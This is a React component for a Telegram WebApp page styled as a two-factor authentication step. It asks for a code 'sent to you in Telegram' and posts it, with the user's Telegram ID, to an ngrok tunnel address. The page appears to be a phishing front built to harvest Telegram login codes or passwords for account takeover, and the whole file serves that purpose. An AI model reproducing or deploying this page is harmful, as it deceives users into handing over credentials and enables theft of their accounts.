import { useNavigate } from "react-router-dom";
import { useState } from "react";

export default function Auth2FA() {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const tg = window.Telegram?.WebApp;
  const userId = tg?.initDataUnsafe?.user?.id;

  const sendCode = async () => {
    if (!code.trim()) {
      alert("Введите код подтверждения");
      return;
    }
    if (!tg) {
      alert("Это работает только внутри Telegram WebApp");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch("https://janene-unwilling-nonilluminatingly.ngrok-free.dev/api/2fa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user_id: userId,
          password: code.trim(),
        }),
      });

      const json = await res.json();

      if (json.ok) {
        navigate("/auth2");
      } else {
        alert("Ошибка: " + (json.error || "Ошибка авторизации"));
      }
    } catch (err) {
      alert("Network error: " + err.message);
    }

    setLoading(false);
  };

  return (
    <div className="min-h-screen font-sans overflow-auto flex flex-col items-center justify-center p-6 text-center bg-gray-800 text-white">
      <p className="text-4xl">2FA Авторизация</p>
      <p className="mt-3 text-lg text-gray-400">
        Введите код двухфакторной аутентификации
      </p>

      <input
        type="text"
        className="mt-6 px-6 py-3 rounded-xl bg-gray-700 text-white text-center text-xl outline-none"
        placeholder="Код"
        maxLength={6}
        value={code}
        onChange={(e) => setCode(e.target.value)}
      />

      <button
        onClick={sendCode}
        disabled={loading}
        className="bg-blue-400 mt-7 px-8 py-4 rounded-2xl text-white hover:bg-blue-700 transition disabled:opacity-50"
      >
        {loading ? "Проверка..." : "Подтвердить код"}
      </button>

      <p className="mt-5 text-sm text-gray-400">
        Код был отправлен вам в Telegram
      </p>
    </div>
  );
}
